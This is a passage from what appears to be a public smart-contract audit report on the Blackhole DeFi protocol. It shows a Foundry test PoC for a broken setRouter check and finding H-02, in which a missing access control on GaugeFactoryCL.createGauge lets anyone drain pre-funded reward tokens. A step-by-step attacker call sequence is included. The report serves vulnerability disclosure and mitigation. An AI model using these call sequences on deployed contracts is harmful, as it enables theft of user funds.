<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">assertFalse</span><span class="mtk1">(</span><span class="mtk12">mockPool</span><span class="mtk1">.</span><span class="mtk11">launchCalled</span><span class="mtk1">(), </span><span class="mtk8">"Launch should not have been successfully called on pool due to revert"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">test_launchSucceedsIfRouterIsValid</span><span class="mtk1">() </span><span class="mtk11">public</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// Ensure router is the initial, valid one</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">assertEq</span><span class="mtk1">(</span><span class="mtk12">manager</span><span class="mtk1">.</span><span class="mtk11">getRouter</span><span class="mtk1">(), </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">initialRouter</span><span class="mtk1">), </span><span class="mtk8">"Initial router setup for test failed"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// Owner tries to launch a pool</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">vm</span><span class="mtk1">.</span><span class="mtk11">prank</span><span class="mtk1">(</span><span class="mtk12">owner</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">manager</span><span class="mtk1">.</span><span class="mtk11">testLaunch</span><span class="mtk1">(</span><span class="mtk12">mockPool</span><span class="mtk1">); </span><span class="mtk3">// This should succeed</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">assertTrue</span><span class="mtk1">(</span><span class="mtk12">mockPool</span><span class="mtk1">.</span><span class="mtk11">launchCalled</span><span class="mtk1">(), </span><span class="mtk8">"Launch was not called on pool"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">assertEq</span><span class="mtk1">(</span><span class="mtk12">mockPool</span><span class="mtk1">.</span><span class="mtk11">currentRouter</span><span class="mtk1">(), </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">initialRouter</span><span class="mtk1">), </span><span class="mtk8">"Pool was launched with incorrect router"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">assertTrue</span><span class="mtk1">(</span><span class="mtk12">initialRouter</span><span class="mtk1">.</span><span class="mtk11">wasCalled</span><span class="mtk1">(), </span><span class="mtk8">"Router's addLiquidity was not called"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span></code></pre>
</details>
<h3 style="position:relative;" id="explanation-of-the-poc"><a class="anchor before" aria-label="explanation of the poc permalink" href="#explanation-of-the-poc"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Explanation of the PoC</h3>
<ol>
<li>
<p><strong><code>SimplifiedGenesisPoolManager</code>:</strong></p>
<ul>
<li>Contains the <code>owner</code>, <code>router</code> state variable, and the vulnerable <code>setRouter</code> function exactly as described.</li>
<li>Includes a <code>constructor</code> to set the initial owner and router.</li>
<li>Includes <code>_launchPool</code> and <code>testLaunch</code> to simulate the scenario where a zero router would cause a failure.</li>
</ul>
</li>
<li><strong><code>MockRouter</code>:</strong> A simple contract implementing <code>IRouter</code>. Its <code>addLiquidity</code> function sets a flag <code>wasCalled</code> to verify interaction.</li>
<li>
<p><strong><code>MockGenesisPool</code>:</strong></p>
<ul>
<li>Implements a <code>launch</code> function.</li>
<li>Crucially, <code>launch</code> will <code>revert("Router is address(0)");</code> if the <code>_router</code> argument is <code>address(0)</code>, mimicking how a real <code>launch</code> would fail if it tried to call <code>IRouter(address(0)).addLiquidity(...)</code>.</li>
<li>It also attempts to call <code>IRouter(_router).addLiquidity</code> to show a successful interaction.</li>
</ul>
</li>
<li><strong><code>MockPairFactory</code>:</strong> A minimal mock for <code>IBaseV1Factory</code> to satisfy dependencies in the simplified <code>_launchPool</code>.</li>
<li>
<p><strong><code>GenesisPoolManagerRouterTest</code> (Test Contract):</strong></p>
<ul>
<li><strong><code>setUp()</code>:</strong> Deploys the <code>SimplifiedGenesisPoolManager</code>, <code>MockRouter</code> instances, <code>MockGenesisPool</code>, and sets the test contract as the <code>owner</code>.</li>
<li>
<p><strong><code>test_ownerCannotSetValidNewRouter()</code>:</strong></p>
<ul>
<li>The <code>owner</code> attempts to call <code>setRouter</code> with <code>newValidRouter</code> (a non-zero address).</li>
<li><code>vm.expectRevert("ZA");</code> asserts that this call reverts with the “ZA” error, proving the <code>require(_router == address(0), "ZA");</code> condition is problematic for valid addresses.</li>
</ul>
</li>
<li>
<p><strong><code>test_ownerCanSetRouterToZeroAddress()</code>:</strong></p>
<ul>
<li>The <code>owner</code> calls <code>setRouter</code> with <code>address(0)</code>.</li>
<li>This call succeeds, and the test asserts that <code>manager.getRouter()</code> is now <code>address(0)</code>.</li>
</ul>
</li>
<li><strong><code>test_nonOwnerCannotCallSetRouter()</code>:</strong> Standard access control test.</li>
<li>
<p><strong><code>test_launchFailsIfRouterIsZero()</code>:</strong></p>
<ul>
<li>The <code>owner</code> first successfully calls <code>setRouter(address(0))</code>.</li>
<li>Then, the <code>owner</code> calls <code>manager.testLaunch(mockPool)</code>.</li>
<li><code>vm.expectRevert("Router is address(0)");</code> asserts that this call reverts. The revert comes from <code>MockGenesisPool.launch()</code> when it detects the zero address router, demonstrating the downstream failure.</li>
</ul>
</li>
<li>
<p><strong><code>test_launchSucceedsIfRouterIsValid()</code>:</strong></p>
<ul>
<li>Ensures the router is the initial valid one.</li>
<li>The <code>owner</code> calls <code>manager.testLaunch(mockPool)</code>.</li>
<li>This call should succeed, <code>mockPool.launchCalled()</code> should be true, and <code>initialRouter.wasCalled()</code> should be true.</li>
</ul>
</li>
</ul>
</li>
</ol>
<p><strong>How to Run (with Foundry):</strong></p>
<ol>
<li>Save the code above as <code>test/GenesisPoolManagerRouter.t.sol</code> (or similar) in your Foundry project.</li>
<li>Ensure you have <code>forge-std</code> (usually included with <code>forge init</code>).</li>
<li>Run the tests: <code>forge test --match-test GenesisPoolManagerRouterTest -vvv</code> (the <code>-vvv</code> provides more verbose output, including console logs if you were to add them).</li>
</ol>
<p>This PoC clearly demonstrates:</p>
<ul>
<li>The <code>setRouter</code> function’s flawed logic.</li>
<li>The <code>owner</code>’s inability to set a new, functional router.</li>
<li>The <code>owner</code>’s ability to set the router to <code>address(0)</code>.</li>
<li>The direct consequence of a zero router address leading to failed pool launches.</li>
</ul>
<p><strong><a href="https://github.com/code-423n4/2025-06-blackhole-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues">Blackhole mitigated</a></strong></p>
<p><strong>Status:</strong> Mitigation confirmed. Full details in reports from <a href="https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-28">rayss</a>, <a href="https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-5">lonelybones</a> and <a href="https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-16">maxvzuvex</a>.</p>
<hr>
<h2 style="position:relative;" id="h-02-reward-token-in-gaugefactorycl-can-be-drained-by-anyone"><a class="anchor before" aria-label="h 02 reward token in gaugefactorycl can be drained by anyone permalink" href="#h-02-reward-token-in-gaugefactorycl-can-be-drained-by-anyone"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a><a href="https://code4rena.com/audits/2025-05-blackhole/submissions/F-120">[H-02] Reward token in <code>GaugeFactoryCL</code> can be drained by anyone</a></h2>
<p><em>Submitted by <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-176">danzero</a>, also found by <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-278">a39955720</a>, <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-435">bareli</a>, <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-62">DarkeEEandMe</a>, <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-375">Kariukigithinji</a>, <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-488">mahadev</a>, <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-361">maxzuvex</a>, <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-441">wafflewizard</a>, <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-206">wankleven</a>, and <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-300">Ziusz</a></em></p>
<p><a href="https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/AlgebraCLVe33/GaugeFactoryCL.sol#L59">https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/AlgebraCLVe33/GaugeFactoryCL.sol#L59</a></p>
<h3 style="position:relative;" id="findings-description-and-impact"><a class="anchor before" aria-label="findings description and impact permalink" href="#findings-description-and-impact"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Findings Description and Impact</h3>
<p>The <code>GaugeFactoryCL.sol</code> contract, responsible for creating <code>GaugeCL</code> instances for Algebra Concentrated Liquidity pools, has a public <code>createGauge</code> function. Below is the implementation of the function:</p>
<pre data-index="3" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">createGauge</span><span class="mtk1">(</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">_rewardToken</span><span class="mtk1">,</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">_ve</span><span class="mtk1">,</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">_pool</span><span class="mtk1">,</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">_distribution</span><span class="mtk1">, </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">_internal_bribe</span><span class="mtk1">, </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">_external_bribe</span><span class="mtk1">, </span><span class="mtk12">bool</span><span class="mtk1"> </span><span class="mtk12">_isPair</span><span class="mtk1">, </span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                        IGaugeManager.FarmingParam </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">farmingParam</span><span class="mtk1">, </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">_bonusRewardToken</span><span class="mtk1">) </span><span class="mtk11">external</span><span class="mtk1"> </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">address</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk11">createEternalFarming</span><span class="mtk1">(</span><span class="mtk12">_pool</span><span class="mtk1">, </span><span class="mtk12">farmingParam</span><span class="mtk1">.</span><span class="mtk12">algebraEternalFarming</span><span class="mtk1">, </span><span class="mtk12">_rewardToken</span><span class="mtk1">, </span><span class="mtk12">_bonusRewardToken</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">last_gauge</span><span class="mtk1"> = </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk4">new</span><span class="mtk1"> </span><span class="mtk10">GaugeCL</span><span class="mtk1">(</span><span class="mtk12">_rewardToken</span><span class="mtk1">,</span><span class="mtk12">_ve</span><span class="mtk1">,</span><span class="mtk12">_pool</span><span class="mtk1">,</span><span class="mtk12">_distribution</span><span class="mtk1">,</span><span class="mtk12">_internal_bribe</span><span class="mtk1">,</span><span class="mtk12">_external_bribe</span><span class="mtk1">,</span><span class="mtk12">_isPair</span><span class="mtk1">, </span><span class="mtk12">farmingParam</span><span class="mtk1">, </span><span class="mtk12">_bonusRewardToken</span><span class="mtk1">, </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk4">this</span><span class="mtk1">)));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">__gauges</span><span class="mtk1">.</span><span class="mtk11">push</span><span class="mtk1">(</span><span class="mtk12">last_gauge</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">return</span><span class="mtk1"> </span><span class="mtk12">last_gauge</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span></code></pre>
<p>The <code>GaugeFactoryCL.createGauge</code> function lacks access control, allowing any external actor to call it. This function, in turn, calls an internal <code>createEternalFarming</code> function. Below is the implementation of the <code>createEternalFarming</code> function:</p>
<pre data-index="4" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">createEternalFarming</span><span class="mtk1">(</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">_pool</span><span class="mtk1">, </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">_algebraEternalFarming</span><span class="mtk1">, </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">_rewardToken</span><span class="mtk1">, </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">_bonusRewardToken</span><span class="mtk1">) </span><span class="mtk11">internal</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">IAlgebraPool</span><span class="mtk1"> </span><span class="mtk12">algebraPool</span><span class="mtk1"> = </span><span class="mtk11">IAlgebraPool</span><span class="mtk1">(</span><span class="mtk12">_pool</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint24</span><span class="mtk1"> </span><span class="mtk12">tickSpacing</span><span class="mtk1"> = </span><span class="mtk11">uint24</span><span class="mtk1">(</span><span class="mtk12">algebraPool</span><span class="mtk1">.</span><span class="mtk11">tickSpacing</span><span class="mtk1">());</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">pluginAddress</span><span class="mtk1"> = </span><span class="mtk12">algebraPool</span><span class="mtk1">.</span><span class="mtk11">plugin</span><span class="mtk1">();        </span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">IncentiveKey</span><span class="mtk1"> </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">incentivekey</span><span class="mtk1"> = </span><span class="mtk11">getIncentiveKey</span><span class="mtk1">(</span><span class="mtk12">_rewardToken</span><span class="mtk1">, </span><span class="mtk12">_bonusRewardToken</span><span class="mtk1">, </span><span class="mtk12">_pool</span><span class="mtk1">, </span><span class="mtk12">_algebraEternalFarming</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">remainingTimeInCurrentEpoch</span><span class="mtk1"> = </span><span class="mtk12">BlackTimeLibrary</span><span class="mtk1">.</span><span class="mtk11">epochNext</span><span class="mtk1">(</span><span class="mtk12">block</span><span class="mtk1">.</span><span class="mtk12">timestamp</span><span class="mtk1">) - </span><span class="mtk12">block</span><span class="mtk1">.</span><span class="mtk12">timestamp</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint128</span><span class="mtk1"> </span><span class="mtk12">reward</span><span class="mtk1"> = </span><span class="mtk7">1e10</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint128</span><span class="mtk1"> </span><span class="mtk12">rewardRate</span><span class="mtk1"> = </span><span class="mtk11">uint128</span><span class="mtk1">(</span><span class="mtk12">reward</span><span class="mtk1">/</span><span class="mtk12">remainingTimeInCurrentEpoch</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">IERC20</span><span class="mtk1">(</span><span class="mtk12">_rewardToken</span><span class="mtk1">).</span><span class="mtk11">safeApprove</span><span class="mtk1">(</span><span class="mtk12">_algebraEternalFarming</span><span class="mtk1">, </span><span class="mtk12">reward</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">customDeployer</span><span class="mtk1"> = </span><span class="mtk11">IAlgebraPoolAPIStorage</span><span class="mtk1">(</span><span class="mtk12">algebraPoolAPIStorage</span><span class="mtk1">).</span><span class="mtk11">pairToDeployer</span><span class="mtk1">(</span><span class="mtk12">_pool</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">IAlgebraEternalFarming</span><span class="mtk1">.</span><span class="mtk12">IncentiveParams</span><span class="mtk1"> </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">incentiveParams</span><span class="mtk1"> = </span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">IAlgebraEternalFarming</span><span class="mtk1">.</span><span class="mtk11">IncentiveParams</span><span class="mtk1">(</span><span class="mtk12">reward</span><span class="mtk1">, </span><span class="mtk7">0</span><span class="mtk1">, </span><span class="mtk12">rewardRate</span><span class="mtk1">, </span><span class="mtk7">0</span><span class="mtk1">, </span><span class="mtk12">tickSpacing</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">IAlgebraEternalFarmingCustom</span><span class="mtk1">(</span><span class="mtk12">_algebraEternalFarming</span><span class="mtk1">).</span><span class="mtk11">createEternalFarming</span><span class="mtk1">(</span><span class="mtk12">incentivekey</span><span class="mtk1">, </span><span class="mtk12">incentiveParams</span><span class="mtk1">, </span><span class="mtk12">pluginAddress</span><span class="mtk1">, </span><span class="mtk12">customDeployer</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span></code></pre>
<p>It is designed to seed a new Algebra eternal farming incentive with an initial, hardcoded amount of 1e10 of the <code>_rewardToken</code>. It achieves this by having <code>GaugeFactoryCL</code> approve the <code>algebraEternalFarming</code> contract, which is then expected to pull these tokens from <code>GaugeFactoryCL</code>. </p>
<p>If the <code>GaugeFactoryCL</code> contract is pre-funded with reward tokens to facilitate this initial seeding for legitimate gauges, an attacker can repeatedly call the <code>createGauge</code> function which will trigger the <code>createEternalFarming</code> process, causing the reward token to be transferred from <code>GaugeFactoryCL</code> to a new Algebra farm associated with a pool specified by the attacker ultimately draining the reward token from the <code>GaugeFactoryCL</code> contract.</p>
<p>The attacker can then potentially stake a Liquidity Provider (LP) NFT into this newly created (spam) <code>GaugeCL</code> and its associated Algebra farm, and subsequently claim that reward.</p>
<h3 style="position:relative;" id="recommended-mitigation-steps-1"><a class="anchor before" aria-label="recommended mitigation steps 1 permalink" href="#recommended-mitigation-steps-1"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<p>Implement robust access control on the <code>GaugeFactoryCL.createGauge()</code> function, restricting its execution to authorized administrators or designated smart contracts, thereby preventing unauthorized calls.</p>
<h3 style="position:relative;" id="proof-of-concept-1"><a class="anchor before" aria-label="proof of concept 1 permalink" href="#proof-of-concept-1"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Proof of Concept</h3>
<ol>
<li>Protocol admin pre-funds <code>GaugeFactoryCL</code> with <code>5e10</code> of USDC (50,000).</li>
<li>Attacker calls <code>GaugeFactoryCL.createGauge()</code>:</li>
</ol>
<pre data-index="5" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1"> </span><span class="mtk11">IGaugeFactoryCL</span><span class="mtk1">(</span><span class="mtk12">GFCL_ADDRESS</span><span class="mtk1">).</span><span class="mtk11">createGauge</span><span class="mtk1">(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">     </span><span class="mtk12">USDC_ADDRESS</span><span class="mtk1">,       </span><span class="mtk3">// _rewardToken</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">     </span><span class="mtk12">VE_ADDRESS</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">     </span><span class="mtk12">TARGET_POOL_ADDRESS</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">     </span><span class="mtk12">ATTACKER_ADDRESS</span><span class="mtk1">,   </span><span class="mtk3">// _distribution</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">     </span><span class="mtk12">ATTACKER_ADDRESS</span><span class="mtk1">,   </span><span class="mtk3">// _internal_bribe</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">     </span><span class="mtk12">ATTACKER_ADDRESS</span><span class="mtk1">,   </span><span class="mtk3">// _external_bribe</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">     </span><span class="mtk4">true</span><span class="mtk1">,               </span><span class="mtk3">// _isPair</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">     </span><span class="mtk12">farmingParams</span><span class="mtk1">,      </span><span class="mtk3">// including ALGEBRA_ETERNAL_FARMING_ADDRESS</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">     </span><span class="mtk12">ZERO_ADDRESS</span><span class="mtk1">        </span><span class="mtk3">// _bonusRewardToken</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1"> );</span></span></span></code></pre>
<ol start="3">
<li>The public <code>createGauge</code> function is entered which calls its internal <code>createEternalFarming(_pool, farmingParam.algebraEternalFarming, USDC_ADDRESS, _bonusRewardToken)</code>.</li>
<li>Execution within <code>GaugeFactoryCL.createEternalFarming()</code>:</li>
</ol>
<pre data-index="6" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">createEternalFarming</span><span class="mtk1">(</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">_pool</span><span class="mtk1">, </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">_algebraEternalFarming</span><span class="mtk1">, </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">_rewardToken</span><span class="mtk1">, </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">_bonusRewardToken</span><span class="mtk1">) </span><span class="mtk11">internal</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk3">// ...</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">uint128</span><span class="mtk1"> </span><span class="mtk12">reward</span><span class="mtk1"> = </span><span class="mtk7">1e10</span><span class="mtk1">; </span><span class="mtk3">// 10,000 USDC</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk3">// ...</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk3">// GaugeFactoryCL approves AlgebraEternalFarming to spend its USDC</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk11">IERC20</span><span class="mtk1">(</span><span class="mtk12">_rewardToken</span><span class="mtk1"> </span><span class="mtk3">/* USDC_ADDRESS */</span><span class="mtk1">).</span><span class="mtk11">safeApprove</span><span class="mtk1">(</span><span class="mtk12">_algebraEternalFarming</span><span class="mtk1">, </span><span class="mtk12">reward</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk3">// ...</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk3">// Call to AlgebraEternalFarming which will pull the approved USDC</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk11">IAlgebraEternalFarmingCustom</span><span class="mtk1">(</span><span class="mtk12">_algebraEternalFarming</span><span class="mtk1">).</span><span class="mtk11">createEternalFarming</span><span class="mtk1">(</span><span class="mtk12">incentivekey</span><span class="mtk1">, </span><span class="mtk12">incentiveParamsWithReward</span><span class="mtk1">, </span><span class="mtk12">pluginAddress</span><span class="mtk1">, </span><span class="mtk12">customDeployer</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span></code></pre>
<ol start="5">
<li>Execution within <code>AlgebraEternalFarming.createEternalFarming()</code> <a href="https://github.com/cryptoalgebra/Algebra/blob/f9a0eff66e2e6d3b9c2b794612cd382aaca8f181/src/farming/contracts/farmings/AlgebraEternalFarming.sol#L125">here</a>:</li>
</ol>
<pre data-index="7" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk3">/// @inheritdoc IAlgebraEternalFarming</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">createEternalFarming</span><span class="mtk1">(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">IncentiveKey</span><span class="mtk1"> </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">key</span><span class="mtk1">,</span></span></span>
